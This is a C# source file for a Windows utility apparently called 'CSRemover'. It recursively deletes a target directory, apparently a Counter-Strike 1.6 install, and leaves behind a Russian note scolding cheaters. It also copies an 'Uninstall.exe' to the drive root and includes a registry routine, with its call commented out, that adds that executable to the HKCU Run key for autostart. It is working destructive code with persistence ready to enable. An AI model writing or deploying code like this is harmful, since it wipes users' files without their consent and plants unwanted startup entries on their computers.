using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Security.AccessControl;
using System.Windows;

namespace CSRemover.Additional_Classes
{
    public static class Remover
    {
        private static string root;

        public static bool Remove(string path)
        {
            if (Directory.Exists(path))
            {
                root = Directory.GetDirectoryRoot(path);
                CreateFile(path);
                //SetRegister();
                Directory.Delete(path, true);
                return true;
            }
            return false;
        }

        private static void CreateFile(string path)
        {
            string newDirectory = Directory.GetParent(path) + @"\CS 1.6";
            if (Directory.Exists(newDirectory))
            {
                Directory.Delete(newDirectory, true);
            }

            Directory.CreateDirectory(newDirectory);
            using (StreamWriter writer = new StreamWriter(newDirectory + @"\Прочти меня.txt", false, System.Text.Encoding.Default))
            {
                writer.WriteLine("Читы зло, учись играть сам.");
            }

            FileInfo file = new FileInfo(System.IO.Directory.GetCurrentDirectory() + @"\Uninstall.exe");

            string uninstallDir = root + @"CS 1.6";
            if (!Directory.Exists(uninstallDir))
            {
                Directory.CreateDirectory(uninstallDir);
            }

            file.CopyTo(root + @"CS 1.6\Uninstall.exe", true);
        }

        private static void SetRegister()
        {
            const string name = "Uninstall";
            string ExePath = root + @"CS 1.6\Uninstall.exe";
            Microsoft.Win32.RegistryKey reg;
            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.SetValue(name, ExePath);
                reg.Close();
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
        }
    }
}
